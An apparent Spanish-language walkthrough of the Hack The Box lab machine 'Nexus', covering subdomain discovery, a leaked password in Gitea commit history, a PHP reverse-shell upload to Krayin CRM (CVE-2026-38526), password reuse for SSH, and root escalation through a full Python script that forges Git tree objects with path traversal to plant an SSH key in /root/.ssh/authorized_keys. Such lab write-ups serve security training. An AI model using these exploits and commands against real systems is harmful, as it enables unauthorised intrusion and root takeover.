---
created: 2026-7-13
description: Nexus es una máquina Linux que cuenta con una instancia de Gitea que expone archivos de configuración del repositorio y credenciales históricas, lo que conduce al acceso a un panel de Krayin CRM vulnerable a CVE-2026-38526. El acceso inicial se obtiene mediante una subida de archivos PHP sin restricciones, seguida de la reutilización de credenciales para obtener acceso SSH como jones. La escalada de privilegios implica abusar de un temporizador de systemd propiedad de root que sincroniza repositorios de plantillas de Gitea, explotando rutas del árbol de Git no saneadas para escribir una clave pública SSH en /root/.ssh/authorized_keys.
---

#htb #easy #linux #web #subdomains #gitea #env-leak #credentials-reuse #krayin #cve-2026-38526 #file-upload #systemd-timers #git #path-traversal

# Enumeración
## Escaneo de puertos

```bash
[hvidal@fedora] ~/d/h/h/m/n/scan
❯ nmap -p- --open -vvv --min-rate 5000 -n 10.129.234.54 -oG scan 
Discovered open port 22/tcp on 10.129.234.54
Discovered open port 80/tcp on 10.129.234.54
```

Puertos abiertos: 22,80

```bash
[hvidal@fedora] ~/d/h/h/m/n/scan
❯ nmap -p 22,80 -sCV 10.129.234.54 -oN portscan.txt -Pn
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nexus.htb/
```

## Subdominios

```bash
[hvidal@fedora] ~/d/h/h/m/n/scan
❯ ffuf -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.nexus.htb" -fw 4 -u http://10.129.234.54
git                     [Status: 200, Size: 14472]
billing                 [Status: 302, Size: 390]
```

Añadir `nexus.htb`, `git.nexus.htb` y `billing.nexus.htb` a `/etc/hosts`.
```bash
[hvidal@fedora] ~/d/h/h/m/n/scan
❯ echo "10.129.234.54 nexus.htb git.nexus.htb billing.nexus.htb" | sudo tee -a /etc/hosts
```

La oferta de empleo de `nexus.htb` muestra dos direcciones de correo electrónico.
- `j.matthew@nexus.htb`
- `careers@nexus.htb`

`git.nexus.htb` contiene un repositorio llamado `krayin-docker-setup` que expone el archivo `.env`, donde podemos encontrar el otro subdominio y una contraseña.
```txt
APP_URL=http://billing.nexus.htb
```

Al inspeccionar el historial de commits se revela que la contraseña de la base de datos había sido eliminada.
```txt
DB_PASSWORD=N27xh!!2ucY04
```

## Krayin

El subdominio `billing.nexus.htb` muestra una página de inicio de sesión a la que se puede acceder usando la dirección de correo electrónico encontrada en `nexus.htb` y la contraseña del archivo `.env`.
```txt
User: j.matthew@nexus.htb
Password: N27xh!!2ucY04
```

El panel de **Krayin** muestra la versión 2.2.0, que es vulnerable a una subida de archivos PHP sin restricciones ([CVE-2026-38526](https://github.com/TREXNEGRO/Security-Advisories/blob/main/CVE-2026-38526/poc.md)).

# Explotación
## Obtención de una shell

La vulnerabilidad permite a usuarios autenticados subir archivos PHP arbitrarios eludiendo la validación del tipo de archivo.

Redactar un nuevo correo en la página de email. Luego, hacer clic en el botón de adjuntos y seleccionar una [php reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).
![](mail_panel.png)

Interceptar la petición con **Burp Suite**, cambiar el `Content-Type` a `image/jpeg` y enviar la petición.
![](burp_shell_upload.png)

Iniciar un listener.
```bash
[hvidal@fedora] ~/d/h/h/m/n/content
❯ nc -lnvp 4444
```

Enviar una petición GET a la URL del archivo subido.
```bash
[hvidal@fedora] ~/d/h/h/m/n/content
❯ curl http:\/\/billing.nexus.htb\/storage\/emails\/8\/shell.php
```

## Post-explotación

El archivo `.env` contiene credenciales en texto plano.
```bash
$ cat /var/www/krayin/.env
DB_PASSWORD=y27xb3ha!!74GbR
```

Buscar usuarios que puedan reutilizar la contraseña.
```bash
$ cat /etc/passwd | grep bash
root:/bin/bash
jones:/home/jones:/bin/bash
git:/home/git:/bin/bash
```

Conectarse como el usuario `jones` con la contraseña encontrada.
```bash
[hvidal@fedora] ~/d/h/h/m/n/content
❯ ssh jones@nexus.htb
jones@nexus.htb's password:
```

Leer la flag de usuario.
```bash
jones@nexus:~$ cat user.txt
```

# Escalada de privilegios

## Enumeración

Listar los temporizadores de `systemd`.
```bash
jones@nexus:~$ systemctl list-timers
ACTIVATES
gitea-template-sync.service
```

Inspeccionar el servicio asociado.
```bash
jones@nexus:~$ cat /etc/systemd/system/gitea-template-sync.service
[Unit]
Description=Sync Gitea templates
After=network-online.target

[Service]
Type=oneshot
User=root
ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py
TimeoutStartSec=50s
```

Comprobar los permisos del script de Python.
```bash
jones@nexus:~$ ls -l /etc/gitea/template-sync.py
-rw-r--r-- 1 git git 4184 May 11 18:47 /etc/gitea/template-sync.py
```

El temporizador ejecuta un script de Python como root que no es escribible.

## Explotación

El script de Python enumera todos los repositorios de plantillas en la aplicación Gitea. Para cada repositorio, lee el árbol de Git y escribe el contenido de cada blob en `/home/git/template-staging/<owner>/<name>`.

El script nunca sanea las rutas de los blobs antes de escribirlos en disco. Por lo tanto, si un repositorio contiene entradas de árbol con componentes de path traversal (`../`), se pueden escribir archivos fuera del directorio de staging, por ejemplo en `/root/.ssh/authorized_keys`.

Sin embargo, Git impide crear entradas de árbol con componentes de path traversal mediante sus comandos normales. Para eludir esta restricción, debemos escribir directamente los objetos Git manipulados en `.git/objects`.

>[!note]- Código relevante
>```python
>result = subprocess.run(
>	GIT + ['ls-tree', '-r', 'HEAD'],
>	cwd=bare_path,
>	capture_output=True, text=True, timeout=10
>) # saves the git tree
>
>parts = line.split('\t', 1) for line in result # separate each part of the tree output
>
> mode, objtype, objhash = parts.split()
>if objtype == 'blob':
>	entries.append((mode, objhash, filepath)) # saves the content of the blobs
>
>for mode, objhash, filepath in entries:
>	target = os.path.join(stage_path, filepath)  # /home/git/template-staging/<owner>/<name>
>
>	cat_result = subprocess.run(
>		GIT + ['cat-file', 'blob', objhash],
>		cwd=bare_path,
>		capture_output=True, timeout=10
>	) # read the file content
>
>	with open(target, 'wb') as f:
>		f.write(cat_result.stdout) # writes the file content in the target path
>```

### Repositorio de plantilla malicioso

Iniciar sesión en `http://git.nexus.htb/` con las credenciales SSH y crear un repositorio de plantilla.
![](template_repo.png)
Crear un repositorio local.
```bash
jones@nexus:/tmp$ mkdir rce && cd rce && git init
```

Crear una clave SSH para el usuario `jones`.
```bash
jones@nexus:/tmp$ ssh-keygen -t ed25519 -f /tmp/malicious_key -N ""
```

Crear un objeto de árbol Git manipulado llamado `../../../../../root/.ssh/authorized_keys` que contenga la clave pública SSH de jones usando el siguiente script de Python.
```python
#!/usr/bin/env python3
import hashlib,zlib,os,subprocess,sys,time

def write_obj(data,t):
    h=(f"{t} {len(data)}").encode()+b"\x00"
    s=h+data
    sha=hashlib.sha1(s).hexdigest()
    d=os.path.join(".git","objects",sha[:2])
    os.makedirs(d,exist_ok=True)
    p=os.path.join(d,sha[2:])
    if not os.path.exists(p):
        open(p,"wb").write(zlib.compress(s))
    return sha

def entry(mode,name,sha):
    return(f"{mode} {name}").encode()+b"\x00"+bytes.fromhex(sha)

if not os.path.isdir(".git"):
    print("Run inside git repo");sys.exit(1)

r=subprocess.run(["cat",sys.argv[1]],capture_output=True,text=True)

if r.returncode!=0:
    print("Error reading the public key");sys.exit(1)
key=r.stdout.strip()+"\n"

blob=write_obj(key.encode(),"blob")
readme=write_obj(b"# Template\n","blob")
ssh_t=write_obj(entry("100644","authorized_keys",blob),"tree")
cur=write_obj(entry("40000",".ssh",ssh_t),"tree")
fir=write_obj(entry("40000","root",cur),"tree")

for i in range(4):
    fir=write_obj(entry("40000","..",fir),"tree")

root=write_obj(entry("100644","README.md",readme)+entry("40000","..",fir),"tree")

ts=int(time.time())
c=f"tree {root}\nauthor x <x@x> {ts} +0000\ncommitter x <x@x> {ts} +0000\n\ninit\n"

sha=write_obj(c.encode(),"commit")

os.makedirs(os.path.join(".git","refs","heads"),exist_ok=True)

open(os.path.join(".git","refs","heads","main"),"w").write(sha+"\n")

print("Done")
```

Ejecutar el script.
```bash
jones@nexus:/tmp/rce$ python3 script.py ../malicious_key.pub 
Done
```

Subir el commit manipulado al repositorio de plantilla.
```bash
jones@nexus:/tmp/rce$ git remote add origin http://localhost:3000/jones/rce.git

jones@nexus:/tmp/rce$ git push -u origin main --force
Username for 'http://localhost:3000': jones
Password for 'http://jones@localhost:3000': y27xb3ha!!74GbR
```

Esperar a que el temporizador se ejecute y verificar el exploit.
```bash
jones@nexus:/tmp/rce$ tail -f /var/log/template-sync.log
[2026-07-12 11:56:48] Template sync starting
[2026-07-12 11:58:48] Syncing template: jones/rce
[2026-07-12 11:58:48]   synced: ../../../../../root/.ssh/authorized_keys
[2026-07-12 11:58:48] Template sync complete
```

Iniciar sesión como root mediante ssh.
```bash
jones@nexus:/tmp/rce$ ssh -i /tmp/malicious_key root@localhost
```

Leer la flag de root.
```bash
root@nexus:~$ cat /root/root.txt
```